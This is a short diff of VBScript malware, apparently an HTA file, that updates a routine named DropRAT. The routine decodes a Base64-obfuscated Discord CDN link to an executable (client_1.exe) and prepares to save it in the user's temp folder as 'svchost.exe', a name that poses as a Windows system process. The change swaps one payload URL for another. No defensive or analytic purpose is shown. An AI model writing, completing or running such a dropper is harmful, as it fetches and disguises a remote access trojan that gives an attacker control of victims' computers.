@@ -46,8 +46,8 @@ window.close()
 
 ' --- RAT DROP ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572374295328595989/client_1.exe?ex=6afe232d&is=6afcd1ad&hm=c38c39196b3e3dcea4c5b2b717a00299b74bf7c6eee187fa27238f7cd91887ee&
-    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcyMzc0Mjk1MzI4NTk1OTg5L2NsaWVudF8xLmV4ZT9leD02YWZlMjMyZCZpcz02YWZjZDFhZCZobT1jMzhjMzkxOTZiM2UzZGNlYTRjNWIyYjcxN2EwMDI5OWI3NGJmN2M2ZWVlMTg3ZmEyNzIzOGY3Y2Q5MTg4N2VlJg=="
+    ' Base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572384523742740540/client_1.exe?ex=6afe2cb3&is=6afcdb33&hm=8cbfe0ce1710dfc794aa8acfe86754c147e61e317c07f23093e98c09664fcedf&
+    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcyMzg0NTIzNzQyNzQwNTQwL2NsaWVudF8xLmV4ZT9leD02YWZlMmNiMyZpcz02YWZjZGIzMyZobT04Y2JmZTBjZTE3MTBkZmM3OTRhYThhY2ZlODY3NTRjMTQ3ZTYxZTMxN2MwN2YyMzA5M2U5OGMwOTY2NGZjZWRmJg=="
     Dim dl : dl = DecodeB64(b64Url)
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\svchost.exe"
